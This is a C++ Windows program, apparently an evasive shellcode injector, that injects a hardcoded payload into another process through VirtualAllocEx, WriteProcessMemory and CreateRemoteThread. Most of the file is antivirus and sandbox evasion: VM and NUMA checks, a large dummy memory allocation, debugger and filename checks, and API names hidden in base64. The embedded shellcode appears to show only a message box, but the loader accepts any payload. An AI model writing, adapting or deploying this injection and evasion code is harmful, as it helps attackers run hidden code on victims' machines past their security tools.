#include <iostream>
#include <Windows.h>
#include <conio.h>
#include <Math.h>
#include "base64.h"


typedef HMODULE(WINAPI* pGetModuleHandle)(
    LPCSTR lpModuleName
    );

typedef HANDLE(WINAPI* pCreateRemoteThread)(
    HANDLE                 hProcess,
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
    );

typedef BOOL(WINAPI* pWriteProcessMemory)(
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T* lpNumberOfBytesWritten
    );

typedef LPVOID(WINAPI* pVirtualAllocExNuma) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect,
    DWORD          nndPreferred
);


typedef LPVOID(WINAPI* pVirtualAllocEx) (
    HANDLE         hProcess,
    LPVOID         lpAddress,
    SIZE_T         dwSize,
    DWORD          flAllocationType,
    DWORD          flProtect
);

typedef HANDLE(WINAPI* pOpenProcess)(DWORD dwDesiredAccess, BOOL  bInheritHandle, DWORD dwProcessId);


 // check if running in  a vm
BOOL NotVM() {
    SYSTEM_INFO s;
    MEMORYSTATUSEX ms;
    DWORD procNum;
    DWORD ram;

    // check number of processors
    GetSystemInfo(&s);
    procNum = s.dwNumberOfProcessors;
    if (procNum < 2) return false;

    // check RAM
    ms.dwLength = sizeof(ms);
    GlobalMemoryStatusEx(&ms);
    ram = ms.ullTotalPhys / 1024 / 1024 / 1024;
    std::cout << ram << std::endl;
    if (ram < 2) return false;

    return true;
}
//NUMA allocation fails on vm
BOOL WINAPI allocNUMA() {
    LPVOID mem = NULL;
    pVirtualAllocExNuma myVirtualAllocExNuma = (pVirtualAllocExNuma)GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocExNuma");
    mem = myVirtualAllocExNuma(GetCurrentProcess(), NULL, 1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE, 0);
    if (mem != NULL) {
        return false;
    }
    else {
        return true;
    }
}


// trying to switch to base64 from XOR encoding

std::string StrRemoteThread = base64_decode("Q3JlYXRlUmVtb3RlVGhyZWFk");
std::string StrVirtualAlloc = base64_decode("VmlydHVhbEFsbG9jRXg=");
std::string StrK32 = base64_decode("a2VybmVsMzIuZGxs");
std::string StrWriteProcessMem = base64_decode("V3JpdGVQcm9jZXNzTWVtb3J5");
BOOL WINAPI bsod() {
    // qeurying ntdll causes av flags
    return (-2);
}

int main(int argc, char* argv[]){
    if (NotVM() == false) {
        printf("vm detected quitting");
        return bsod();
    }
    std::cout << "NUMA:" << allocNUMA() << std::endl;
    if (allocNUMA()) {
        printf("numalloc fails");
        return bsod();
    }

    if (strstr(argv[0], "WinKillHaha.exe") == NULL) {
        printf("How dare you change my name without consent. :( \n");
        return bsod();
    }

    if (IsDebuggerPresent()) {
        printf("how dare you attach shit to me :(\n");
        return bsod();
    }


    unsigned char payload[] =
        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
        "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
        "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
        "\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2"
        "\xed\x52\x41\x51\x3e\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48"
        "\x01\xd0\x3e\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x6f"
        "\x48\x01\xd0\x50\x3e\x8b\x48\x18\x3e\x44\x8b\x40\x20\x49"
        "\x01\xd0\xe3\x5c\x48\xff\xc9\x3e\x41\x8b\x34\x88\x48\x01"
        "\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01"
        "\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0\x66\x3e\x41"
        "\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e\x41\x8b"
        "\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58"
        "\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41"
        "\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7"
        "\xc1\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e"
        "\x4c\x8d\x85\x25\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83"
        "\x56\x07\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x4d\x65\x6f\x77\x2d\x6d\x65\x6f\x77\x21\x00\x3d\x5e"
        "\x2e\x2e\x5e\x3d\x00";

   
    // OBFUSCATION GO BRRRRRR
    HMODULE hKernel32 = GetModuleHandle(StrK32.c_str());
 
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    PVOID rb; // remote buffer

    char* mem = NULL;
    mem = (char*)malloc(4000000000); // PROFESSIONAL TROLLING
    memset(mem, 00, 4000000000);
    printf("memset\n");

    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    printf("Opened process\n");

    // Get module handle of kernel32.dll
    
    // use virtualallocex to allocate empty buffer on remote process

    pVirtualAllocEx myVirtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, StrVirtualAlloc.c_str());
    rb = myVirtualAllocEx(ph, NULL, sizeof(payload), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // copy data to empty buffer on remote  process
    printf("WriteProcMem\n");
    pWriteProcessMemory myWriteProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, StrWriteProcessMem.c_str());
    myWriteProcessMemory(ph, rb, payload, sizeof(payload), NULL);
    // create remote thread
    pCreateRemoteThread myCreateRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, StrRemoteThread.c_str());
    rt = myCreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)rb, NULL, 0, NULL);
    printf("remotethread\n");
    CloseHandle(ph);
    free(mem);

}

